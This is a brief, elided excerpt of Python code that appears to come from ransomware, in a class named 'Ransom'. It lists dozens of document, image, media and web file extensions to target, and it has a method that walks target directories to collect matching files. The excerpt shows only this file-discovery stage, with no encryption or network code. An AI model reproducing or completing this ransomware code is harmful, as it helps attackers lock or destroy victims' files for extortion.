...
path = f'{gettempdir()}/logs/all_files'
...
class Ransom:
    ...
    file_exts = (
        '.txt', '.py', '.jpg', '.svg', '.xls',
        '.png', '.jpeg', '.pdf', '.docx', '.csv',
        '.zip', '.mkv', '.mp4', '.mp3', '.xlsx',
        '.xml', '.gif', '.ppt', '.pptx', '.wmv',
        '.doc', '.htm', '.html', '.php', '.wps',
        '.dot', '.docm', '.odt', '.rtf', '.odt',
        '.dotx', '.xps', '.aspx', '.xlsm', '.xlsb',
        '.xltx'
    )
    ...
    def get_all_files(self):
        for localDirs in self.target_directory:
            localTarget = os.walk(localDirs, topdown=True)
            for root, dirs, files in localTarget:
                for file in files:
                    file_path = os.path.join(root, file)
                    print(f' * File: {file}')

                    if not file.endswith(self.file_exts):
                        continue
